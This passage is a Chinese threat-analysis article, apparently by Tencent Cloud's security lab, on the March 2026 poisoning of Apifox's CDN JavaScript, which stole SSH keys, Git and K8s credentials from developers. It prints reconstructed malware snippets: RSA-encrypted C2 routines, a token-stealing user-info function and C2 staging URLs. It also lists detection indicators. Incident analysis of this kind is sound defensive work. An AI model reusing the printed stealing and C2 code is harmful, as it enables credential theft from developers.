---
title: 从无差别攻击到APT定向攻击：Apifox供应链投毒攻击链路完整剖析
url: https://mp.weixin.qq.com/s/JMusfk2N9XyMA-iJoEetLg
source: Doonsec's feed
date: 2026-04-02
fetch_date: 2026-04-03T04:26:22.094968
---

# 从无差别攻击到APT定向攻击：Apifox供应链投毒攻击链路完整剖析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VL7Qr6N3skjg7Uibd5S5iacus3I6rb2jxo9o1Txf3SFHu3U5S9YjEYA9gW0JRMIKUjrJJh0puothlV9RvAMPcdZl93ib0yvY1mnkAsZ3qd9K6E/0?wx_fmt=jpeg)

# 从无差别攻击到APT定向攻击：Apifox供应链投毒攻击链路完整剖析

原创

腾讯云安全
腾讯云安全

云鼎实验室

![]()

在小说阅读器中沉浸阅读

**一、事件概述**

##

### 1.1 攻击背景

2026 年 3 月，公网 SaaS 版 Apifox 桌面客户端遭遇了一起精心策划的供应链攻击，攻击者通过篡改 CDN 托管的 JavaScript 文件进行投毒，利用 Electron 渲染进程的 Node.js 接口权限，在 Apifox 客户端初始化阶段加载远程JS脚本时执行恶意代码，实现了远程控制与开发凭证窃取。

本文基于公开 IoC 进行技术分析，结合开源威胁情报、网络空间测绘、主动狩猎、AI代码分析、AI 样本分析等手段，还原攻击者完整攻击链路，并对攻击基础设施、武器工具、隐蔽手法进行分析溯源。

### 1.2 攻击特征分析

|  |  |
| --- | --- |
| **维度** | **特征值** |
| **攻击向量** | CDN站点投毒 +   Electron安全配置缺陷 |
| **攻击目标** | 开发者办公终端，窃取SSH密钥、Git凭证、K8s配置等高价值资产 |
| **基础设施** | 仿冒域名 + Cloudflare CDN隐匿 + 海外云服务器 |
| **攻击工具** | Electron C2 + yfrp内网穿透 + rc-agent远控 |
| **流量对抗** | RSA加密通信 + DNS TXT隐蔽信道 + TLS流量伪装 |
| **样本对抗** | javascript-obfuscator混淆 + UPX加壳 + Golang代码混淆 |
| **生命周期** | 投毒周期18天（2026/03/04 ~ 03/22），凭证被盗后续影响未知，可能引发二次供应链投毒 |
| **攻击者能力** | APT级别，具备完整的攻击基础设施与运营能力 |

###

### 1.3 攻击影响

* 受影响条件: CDN站点投毒期间重新启动、初次启动Apifox客户端的用户，包括Windows、MacOS、Linux客户端
* 窃取资产: SSH私钥、Git凭证、K8s配置、npm Token、SVN凭证、Shell历史等
* 潜在风险: 企业内网渗透、代码仓库入侵、云原生环境沦陷
* 防御难点: CDN站点投毒难以检测、Electron安全配置缺陷、基础设施即弃使用

## 二、攻击时间线

```
2026-03-04  ├─ 攻击者上线恶意域名 apifox.it[.]com
            ├─ NS记录指向Cloudflare CDN
            └─ CDN文件开始被投毒

2026-03-04  ├─ 攻击活跃期开始
            ├─ 受感染客户端连接Electron C2服务器
            ├─ 下发Stage-2 v1载荷（collectPreInformations）
            │   └─ 窃取SSH密钥、Git凭证、Shell历史、进程列表
            ├─ 下发Stage-2 v2载荷（collectAddInformations）
            │   └─ 窃取K8s配置、npm Token、SVN凭证、目录结构
            └─ 持续信息窃取与远程控制
                └─ 包括可能下发yfrp隧道穿透工具、rc-agent远控建立持久化后门

2026-03-22  └─ C2域名 apifox.it.com DNS解析下线
2026-03-25  └─ 2Libra社区用户发布Apifox投毒预警
2026-03-25  └─ Apifox官方发布《关于 Apifox 公网 SaaS 版外部 JS 文件受篡改的风险提示与升级公告》
```

攻击持续时间: 约18天（2026-03-04 至 2026-03-22）

## 三、Apifox CDN站点投毒分析

##

### 3.1 Electron客户端分析

Apifox客户端基于Electron框架v37.7.0版本打包，因主进程 app/dist/main/main.js 编译为 bytenode jsc字节码文件，无法判断其是否关闭沙盒 nodeIntegration: true ，但通过对渲染进程 app/dist/renderer/index.html 文件的分析，证实渲染进程具备完整的Node.js和Electron API访问权限：

```
<!-- 162行: 远程CDN脚本加载 -->
<script src="https://cdn.apifox[.]com/www/assets/js/apifox-app-event-tracking.min.js" defer="defer"></script>

<script>
// 336-340行: 直接require Electron模块
const electron = require('electron');
const webUtils = electron.webUtils;

// 354-356行: 使用@electron/remote获取主进程窗口对象
const remote = window.require('@electron/remote');
const win = remote.getCurrentWindow();

// 370行: 访问Node.js原生模块
const osVersion = require('os')?.release();

// 399行: 使用IPC与主进程通信
require('electron').ipcRenderer.send('WindowAction.EnsureWindowUnMaximize');
</script>
```

该JS文件原为Apifox客户端事件追踪SDK，用于接入Google Analytics、某度统计、某云SLS、PostHog等数据统计SDK。

投毒域名  ⁠cdn.apifox[.]com⁠  域名托管在CDN服务商，该服务商并非纯自建CDN节点，而是结合自建CDN、多家主流云厂商（包括公有云、电信运营商及专业CDN服务商）作为融合CDN，目标域名  ⁠cdn.apifox[.]com⁠  经过该CDN服务商的DNS调度最终分配到某云厂商加速CDN，DNS解析链路如下：

|  |  |  |
| --- | --- | --- |
| **层级** | **CNAME记录** | **调度方** |
| 1 | cdn.apifox.com | 用户请求入口 |
| 2 | cdn-apifox-com-idvn0mo.qin\*\*dns.com | 某CDN服务商 DNS调度 |
| 3 | chinacdnv6.idvqvsd.qin\*\*dns.com | 某CDN服务商 DNS调度 |
| 4 | opencdnqin\*\*staticv6.a.b\*\*dns.com | 某云CDN |
| 5 | opencdnqin\*\*staticv6.j\*\*odns.com | 某云CDN |
| 6 | CDN节点IP | CDN边缘节点 |

CDN 节点回源地址为某云存储桶  ⁠apifox-cdn.oss-cn-hangzhou.a\*\*\*ncs[.]com⁠ ，存储桶的  ⁠www/⁠  路径配置了镜像回源，镜像回源地址未知。

攻击者在 apifox-app-event-tracking.min.js 文件代码中植入了一段 javascript-obfuscator 混淆的恶意JavaScript代码，事件曝光时CDN站点投毒JS文件已恢复正常，事后通过Web Archive找到被投毒版本的快照（快照时间：UTC 2026-03-05 05:14:18）：

https://web.archive.org/web/20260305051418/https://cdn.apifox[.]com/www/assets/js/apifox-app-event-tracking.min.js

攻击者利用 Electron 不安全配置缺陷，通过CDN站点投毒的方式在 https://cdn.apifox[.]com/www/assets/js/apifox-app-event-tracking.min.js 文件中注入恶意代码 → 渲染进程加载并执行 → 恶意代码获得完整的Node.js运行环境访问权限 → 执行任意系统命令、窃取敏感文件、建立后门通道。

目前官方并未公开CDN站点投毒攻击原因，结合多台失陷终端 DNS 日志进行分析，在 2026-03-04 ~ 03-22 期间请求 cdn.apifox[.]com 的同时会伴随着请求 apifox.it[.]com 恶意域名，多个地区CDN边缘节点都命中了投毒文件，而非原文章提及的有几率命中投毒文件，可以排除网络劫持攻击的可能性。

因此推断Apifox投毒链路可能包括两家云 CDN 接管、OSS 存储桶投毒、OSS 镜像回源源站投毒 等失陷场景，考虑 Apifox 静态资源源站投毒可能性最大。

### 3.2 Electron C2通信机制

通过AI大模型对 JavaScript 混淆代码进行分析解读还原恶意代码逻辑，基于还原后的代码逻辑对投毒代码进行进一步分析。

攻击者精心设计了 C2 域名伪装策略，实现域名隐藏与流量混淆：

|  |  |
| --- | --- |
| **分析维度** | **分析特征** |
| **域名伪装** | apifox.it[.]com |
| **TLD欺骗** | .it.com 商业域名，注册于Namecheap域名商，具有高度伪装性 |
| **WHOIS** | 无公开信息，完全隐藏所有者身份 |
| **CDN隐匿** | Cloudflare CDN |
| **源站托管** | 13.192.121[.]27 (日本AWS) |
| **生命周期** | 18天 (2026/03/04 ~   2026/03/22)，事件曝光即下线 |

该域名具备典型的 APT 级攻击特征：品牌仿冒 + 隐蔽注册 + CDN 隐匿 + 境外托管 + 即弃使用。

在通信流程上，采用多阶段载荷加载机制：

Stage-1 ( Heartbeat 心跳 ):

URL: https://apifox.it[.]com/public/apifox-event.js

功能: header携带环境信息上报心跳，返回加密JS内容，解密后动态创建<script>标签加载Stage-2

Stage-2 ( Payload 载荷 ):

URL: https://apifox.it[.]com/<随机8位hex>.js

特点: Payload URL 一次性有效，用于执行二阶段恶意 Payload，如凭证窃取模块 collectPreInformations 、 collectAddInformations

Electron C2 所有 http 请求响应基于 RSA-2048 私钥实现双向加密通信：

```
// 内嵌的 RSA 私钥
constPRIVATE_KEY=`-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDOPeHTeyrblELD
...
-----END PRIVATE KEY-----`;

// 客户端加密外发数据
functionrsaEncrypt(plaintext){
return crypto.privateEncrypt(
{ key:PRIVATE_KEY, padding: crypto.constants.RSA_PKCS1_PADDING},
        Buffer.from(plaintext,'utf8')
).toString('base64');
}

// 解密C2下发的载荷
functionrsaDecrypt(encryptedBase64){
// 按256字节分块解密
for(let i =0; i < encryptedBuffer.length; i +=256){
        chunks.push(
            crypto.privateDecrypt(
{ key:PRIVATE_KEY, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING},
                encryptedBuffer.slice(i, i +256)
)
);
}
return Buffer.concat(chunks).toString('utf8');
}
```

###

### 3.3 信息收集与指纹生成

指纹生成机制：收集受害机器 5 个维度的硬件/系统信息，拼接后进行 SHA-256 哈希生成唯一机器标识 af\_uuid。

|  |  |  |
| --- | --- | --- |
| **维度** | **收集内容** | **用途** |
| **MAC地址** | 第一个非内部、非全0的网卡地址 | 物理设备标识 |
| **CPU型号** | os.cpus()[0].model | 硬件特征 |
| **主机名** | os.hostname() | 网络标识 |
| **用户名** | os.userInfo().username | 用户身份 |
| **操作系统** | os.type() | 系统类型 |

恶意代码使用 localStorage 缓存收集的信息，避免重复系统调用：

|  |  |  |
| --- | --- | --- |
| **localStorage键名** | **存储内容** | **用途** |
| \_rl\_mc | SHA-256机器指纹 | 避免重复计算指纹 |
| \_rl\_headers | JSON格式的完整信息头 | 减少系统调用开销 |

Electron 使用 LevelDB 作为 localStorage 后端存储，Apifox客户端 leveldb 目录路径如下，可通过检索 leveldb 目录文件中的 \_rl\_mc 和 \_rl\_headers 等特征，快速识别系统是否被投毒感染：

|  |  |
| --- | --- |
| **操作系统** | **Leveldb存储路径** |
| **macOS** | ~/Library/Application   Support/apifox/Local Storage/leveldb/ |
| **Windows** | C:\Users\<用户名>\AppData\Roaming\apifox\Local   Storage\leveldb\ |
| **Linux** | ~/.config/apifox/Local Storage/leveldb/ |

### 3.4 Apifox用户信息窃取

恶意代码通过 apifox 接口获取用户邮箱地址及用户名，若用户注册邮箱为企业员工邮箱，攻击者可锁定目标企业 Apifox 失陷终端下发二阶段载荷，从而实现定向APT攻击。

```
asyncfunctiongetApifoxHeaders(){
// 从localStorage窃取登录token
const accessToken = localStorage.getItem('common.accessToken');

// 调用Apifox官方API获取用户信息
const response =awaitfetch('https://api.apifox[.]com/api/v1/user',{
        headers:{'authorization': token }
});

const data =await response.json();

return{
'af_apifox_user':rsaEncrypt(data.data.email),
'af_apifox_name':rsaEncrypt(data.data.name)
};
}
```

### 3.5 攻击链与执行流程

完整执行流程：

```
┌─────────────────────────────────────────────────────────────┐
│  1. 初始化阶段                                                │
├─────────────────────────────────────────────────────────────┤
│  Apifox启动 → 加载CDN JS → 执行恶意代码 → 立即调用            │
│  loadAndExecute()                                            │
└─────────────────────────────────────────────────────────────┘
│
↓
┌─────────────────────────────────────────────────────────────┐
│  2. 信息收集阶段                                              │
├─────────────────────────────────────────────────────────────┤
│  getBaseHeaders() → 检查缓存                                 │
│       ↓ (无缓存)                                             │
│  生成机器指纹 (MAC+CPU+主机名+用户名+OS) → SHA-256哈希         │
│       ↓                                                      │
│  持久化到 localStorage (_rl_mc, _rl_...